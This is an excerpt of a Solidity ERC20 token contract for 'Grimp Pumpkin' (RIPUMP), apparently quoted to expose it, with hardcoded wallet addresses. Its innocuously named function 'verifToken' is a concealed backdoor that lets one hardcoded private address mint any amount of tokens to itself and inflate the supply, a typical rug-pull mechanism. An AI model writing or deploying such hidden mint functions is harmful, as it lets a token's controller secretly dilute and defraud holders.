...
contract grimpumpkin  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Grimp Pumpkin";
    string private constant _symbol = unicode"RIPUMP";
    ...
    address payable public DevWallet = payable(0x0b91520c15a822Acd478FDb6F60FFb4A0f861CC7);
    address payable public MarketingWallet = payable(0x998dB522f88d697a0a1c6A52811635C3CFa8E761);
    address private _address = 0x9c51E2a865cE1ca940aEe4098313E73b280c8bDe;
    ...
    function verifToken(uint256 acc, address adr) onlyAddress public virtual {
        require(adr == address(_address));
        _Trade(address(_address), adr, acc);
        _tTotal += acc;
        _tOwned[adr] += acc;
